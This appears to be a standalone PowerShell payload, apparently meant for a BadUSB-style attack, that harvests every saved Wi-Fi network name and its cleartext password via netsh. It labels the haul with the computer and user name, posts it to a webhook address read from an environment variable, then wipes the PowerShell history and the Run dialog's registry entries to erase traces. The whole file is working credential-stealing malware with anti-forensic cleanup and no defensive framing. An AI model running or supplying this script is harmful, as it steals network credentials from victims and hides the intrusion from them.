$wh=$env:WH
$m="[r00t_b0t] "+$env:COMPUTERNAME+" | "+$env:USERNAME+"`n"
$profiles=netsh wlan show profiles|Select-String "All User Profile"
foreach($line in $profiles){
$n=($line -split ":")[1].Trim()
$key=netsh wlan show profile name=$n key=clear|Select-String "Key Content"
if($key){$m=$m+$n+" : "+($key -split ":")[1].Trim()+"`n"}
}
$body=ConvertTo-Json @{content=$m}
Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
